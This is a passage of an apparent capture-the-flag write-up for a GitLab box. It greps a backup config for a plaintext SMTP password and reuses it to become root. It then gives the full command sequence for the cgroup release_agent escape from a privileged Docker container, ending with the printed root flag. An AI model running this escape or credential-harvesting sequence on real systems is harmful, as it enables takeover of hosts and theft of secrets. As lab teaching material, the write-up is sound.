# pgbouncer['server_check_delay'] = 30
# pgbouncer['max_db_connections'] = nil
# pgbouncer['max_user_connections'] = nil
# pgbouncer['syslog'] = 0
# pgbouncer['syslog_facility'] = 'daemon'
# pgbouncer['syslog_ident'] = 'pgbouncer'
# pgbouncer['log_disconnections'] = 1
# pgbouncer['log_pooler_errors'] = 1
# pgbouncer['stats_period'] = 60
# pgbouncer['verbose'] = 0
# pgbouncer['server_lifetime'] = 3600
# pgbouncer['server_connect_timeout'] = 15
# pgbouncer['server_login_retry'] = 15
# pgbouncer['query_timeout'] = 0
# pgbouncer['query_wait_timeout'] = 120
# pgbouncer['client_idle_timeout'] = 0
# pgbouncer['client_login_timeout'] = 60
# pgbouncer['autodb_idle_timeout'] = 3600
# pgbouncer['suspend_timeout'] = 10
# pgbouncer['idle_transaction_timeout'] = 0
# pgbouncer['pkt_buf'] = 4096
# pgbouncer['listen_backlog'] = 128
# pgbouncer['sbuf_loopcnt'] = 5
# pgbouncer['max_packet_size'] = 2147483647
# pgbouncer['tcp_defer_accept'] = 0
# pgbouncer['tcp_socket_buffer'] = 0
# pgbouncer['tcp_keepalive'] = 1
# pgbouncer['tcp_keepcnt'] = 0
# pgbouncer['tcp_keepidle'] = 0
# pgbouncer['tcp_keepintvl'] = 0
# pgbouncer['disable_pqexec'] = 0

## Pgbouncer client TLS options
# pgbouncer['client_tls_sslmode'] = 'disable'
# pgbouncer['client_tls_ca_file'] = nil
# pgbouncer['client_tls_key_file'] = nil
# pgbouncer['client_tls_cert_file'] = nil
# pgbouncer['client_tls_protocols'] = 'all'
# pgbouncer['client_tls_dheparams'] = 'auto'
# pgbouncer['client_tls_ecdhcurve'] = 'auto'
#
## Pgbouncer server  TLS options
# pgbouncer['server_tls_sslmode'] = 'disable'
# pgbouncer['server_tls_ca_file'] = nil
# pgbouncer['server_tls_key_file'] = nil
# pgbouncer['server_tls_cert_file'] = nil
# pgbouncer['server_tls_protocols'] = 'all'
# pgbouncer['server_tls_ciphers'] = 'fast'

################################################################################
# Repmgr (EE only)
################################################################################
# repmgr['enable'] = false
# repmgr['cluster'] = 'gitlab_cluster'
# repmgr['database'] = 'gitlab_repmgr'
# repmgr['host'] = nil
# repmgr['node_number'] = nil
# repmgr['port'] = 5432
# repmgr['trust_auth_cidr_addresses'] = []
# repmgr['user'] = 'gitlab_repmgr'
# repmgr['sslmode'] = 'prefer'
# repmgr['sslcompression'] = 0
# repmgr['failover'] = 'automatic'
# repmgr['log_directory'] = '/var/log/gitlab/repmgrd'
# repmgr['node_name'] = nil
# repmgr['pg_bindir'] = '/opt/gitlab/embedded/bin'
# repmgr['service_start_command'] = '/opt/gitlab/bin/gitlab-ctl start postgresql'
# repmgr['service_stop_command'] = '/opt/gitlab/bin/gitlab-ctl stop postgresql'
# repmgr['service_reload_command'] = '/opt/gitlab/bin/gitlab-ctl hup postgresql'
# repmgr['service_restart_command'] = '/opt/gitlab/bin/gitlab-ctl restart postgresql'
# repmgr['service_promote_command'] = nil
# repmgr['promote_command'] = '/opt/gitlab/embedded/bin/repmgr standby promote -f /var/opt/gitlab/postgresql/repmgr.conf'
# repmgr['follow_command'] = '/opt/gitlab/embedded/bin/repmgr standby follow -f /var/opt/gitlab/postgresql/repmgr.conf'

# repmgr['upstream_node'] = nil
# repmgr['use_replication_slots'] = false
# repmgr['loglevel'] = 'INFO'
# repmgr['logfacility'] = 'STDERR'
# repmgr['logfile'] = nil

# repmgr['event_notification_command'] = nil
# repmgr['event_notifications'] = nil

# repmgr['rsync_options'] = nil
# repmgr['ssh_options'] = nil
# repmgr['priority'] = nil
#
# HA setting to specify if a node should attempt to be master on initialization
# repmgr['master_on_initialization'] = true

# repmgr['retry_promote_interval_secs'] = 300
# repmgr['witness_repl_nodes_sync_interval_secs'] = 15
# repmgr['reconnect_attempts'] = 6
# repmgr['reconnect_interval'] = 10
# repmgr['monitor_interval_secs'] = 2
# repmgr['master_response_timeout'] = 60
# repmgr['daemon'] = true
# repmgrd['enable'] = true

################################################################################
# Consul (EEP only)
################################################################################
# consul['enable'] = false
# consul['dir'] = '/var/opt/gitlab/consul'
# consul['user'] = 'gitlab-consul'
# consul['config_file'] = '/var/opt/gitlab/consul/config.json'
# consul['config_dir'] = '/var/opt/gitlab/consul/config.d'
# consul['data_dir'] = '/var/opt/gitlab/consul/data'
# consul['log_directory'] = '/var/log/gitlab/consul'
# consul['node_name'] = nil
# consul['script_directory'] = '/var/opt/gitlab/consul/scripts'
# consul['configuration'] = {
#   'client_addr' => nil,
#   'datacenter' => 'gitlab_consul',
#   'enable_script_checks' => true,
#   'server' => false
# }
# consul['services'] = []
# consul['service_config'] = {
#   'postgresql' => {
#     'service' => {
#       'name' => "postgresql",
#       'address' => '',
#       'port' => 5432,
#       'checks' => [
#         {
#           'script' => "/var/opt/gitlab/consul/scripts/check_postgresql",
#           'interval' => "10s"
#         }
#       ]
#     }
#   }
# }
# consul['watchers'] = {
#   'postgresql' => {
#     enable: false,
#     handler: 'failover_pgbouncer'
#   }
# }
```
a lot of lines commented, not useful, we should grep excluding # at the line's beginning
```
git@gitlab:/opt/backup$ cat gitlab.rb | grep "^[^#]"
cat gitlab.rb | grep "^[^#]"
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```
check su root:
```
git@gitlab:/opt/backup$ su root  
su root
Password: wW59U!ZKMbG9+*#h

root@gitlab:/opt/backup#
```

## If we remember the docker-compose.yml file the container was running in privileged mode
```
root@gitlab:/opt/backup# cat docker-compose.yml
cat docker-compose.yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
----privileged: true-----------------------------------------------------------------------
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16

```

## Escaping Docker Privileged Containers
[Escaping Docker Privileged Containers](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1)

Privileged Docker containers are containers that are run with the --privileged flag. Unlike regular containers, these containers have root privilege to the host machine. Privileged containers are often used when the containers need direct hardware access to complete their tasks. However, privileged Docker containers can enable attackers to take over the host system.

...

Things to know:
- [Mtab](https://es.wikipedia.org/wiki/Mtazb)
- [Cgroup](https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1/cgroups.html)

We are going to use a exploit which runs code through the release_agent file. We need to create a cgroup, specify its release_agent file, and trigger the release_agent by killing all the processes in the cgroup.


Create a new group:
```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

Enable the release_agent feature:
```
echo 1 > /tmp/cgrp/x/notify_on_release
```

Write the path of our command file to the release_agent file:
```
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Write to out command file. This script will execute the *cat /root/root.txt* command and save it to the /output file.
```
echo '#!/bin/sh' > /cmd
echo "cat /root/root.txt > $host_path/output" >> /cmd
chmod a+x /cmd
```

Finally, trigger the attack by spawning a process that immediately ends inside the cgroup that we created. Our release_agent script will execute after the process ends. You can now read the output of *cat /root/root.txt* on the host machine in the /output file:
```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

ROOT FLAG
```
root@gitlab:/# cat output
cat output
b7f98681505cd39066f67147b103c2b3
```